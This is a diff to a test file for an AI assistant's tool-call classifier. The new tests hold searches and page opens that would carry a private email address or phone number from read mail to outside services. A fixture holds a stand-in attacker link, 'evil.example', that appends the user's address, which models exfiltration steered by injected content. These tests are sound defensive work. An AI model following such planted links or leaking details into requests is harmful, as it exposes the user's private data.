@@ -1,6 +1,7 @@
 /**
- * The trust model end to end at the classifier: lookups run, consequences ask, and only a call that read content
- * steered and that would carry something out or take a consequential action is held. Invented people and hosts only.
+ * The trust model end to end at the classifier: lookups run, consequences ask, and a call is held when read
+ * content steered it, when it would carry something out, or when the chat has read someone else's content and
+ * the call would send a private detail of the person's. Invented people and hosts only.
  */
 import type { CalendarWriteReview } from '../../../src/core/calendar/eventWrite';
 import type { ReviewableDraft } from '../../../src/core/email/gmail/draftReview';
@@ -262,7 +263,7 @@ describe('what is held, because content steered it', () => {
     const decision = await classifyTier(openPage('http://evil.example/?u=sam.rivers@example.com'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_steered' });
     expect(decision.card?.plain_what).toBe(
-      'Open a web page: http://evil.example/?u=sam.rivers@example.com. Aman found this link in something it read, and opening it would send more than the link said.',
+      'Open http://evil.example/?u=sam.rivers@example.com? Aman found this link in something it read, and opening it would send more than the link said.',
     );
   });
 
@@ -457,5 +458,80 @@ describe('a scheduled run with nobody watching', () => {
     const ctx = makeCtx({ unattended: true });
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: PHISH });
     expect((await classifyTier(search('weather in San Francisco tomorrow'), ctx)).tier).toBe(1);
+  });
+});
+
+const LETTER = JSON.stringify({
+  from: 'Dana Wolfe <dana@example.org>',
+  to: 'sam.rivers@example.com',
+  body: 'Lovely to see you on Saturday. My new number is +1 415 555 0132, and dana@example.org is still the best address for me.',
+});
+
+describe("a lookup that carries a private detail, in a chat that read someone else's content", () => {
+  it("asks before a search that carries an address from the person's mail", async () => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(search('dana@example.org'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+    expect(decision.card?.plain_what).toBe(
+      'Search the web for dana@example.org? This would send a private detail of yours, in a chat where Aman has read things written by other people, so Aman is checking with you first.',
+    );
+  });
+
+  it("asks before opening a page whose link carries an address from the person's mail", async () => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(openPage('https://directory.example/lookup?email=dana@example.org'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+    expect(decision.card?.plain_what).toContain('This would send a private detail of yours');
+  });
+
+  it("asks before opening a page whose link carries an address from the person's mail in the link's own spelling", async () => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(openPage('https://directory.example/lookup?email=dana%40example.org'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+    expect(decision.card?.plain_what).toContain('This would send a private detail of yours');
+  });
+
+  it("asks before a search that carries an address from the person's mail, written with spaces as people write it", async () => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(search('dana @example.org'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+    expect(decision.card?.plain_what).toContain('This would send a private detail of yours');
+  });
+
+  it("asks before a search that carries the person's phone number from their mail, written another way", async () => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(search('call 415-555-0132 to confirm Saturday'), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+  });
+
+  it("runs the same search when the chat has read only the person's own words", async () => {
+    const ctx = makeCtx();
+    recordPersonText({
+      provenance: ctx.web_search.provenance,
+      text: 'My friend Dana is dana@example.org; look her up',
+    });
+    const decision = await classifyTier(search('dana@example.org'), ctx);
+    expect(decision).toMatchObject({ tier: 1, reason: 'mcp_search_provider', card: null });
+  });
+
+  it('runs a search that carries no private detail, after the chat read mail', async () => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    expect((await classifyTier(search('opening hours for the ferry building'), ctx)).tier).toBe(1);
+  });
+
+  it('skips the lookup for a scheduled run, with a plain line to the owner', async () => {
+    const ctx = makeCtx({ unattended: true });
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(search('dana@example.org'), ctx);
+    expect(decision).toMatchObject({ tier: 3, auto_deny: 'private_detail', card: null });
+    expect(decision.owner_message).toBe(
+      'One lookup was skipped, because it would have shared something private about you.',
+    );
   });
 });
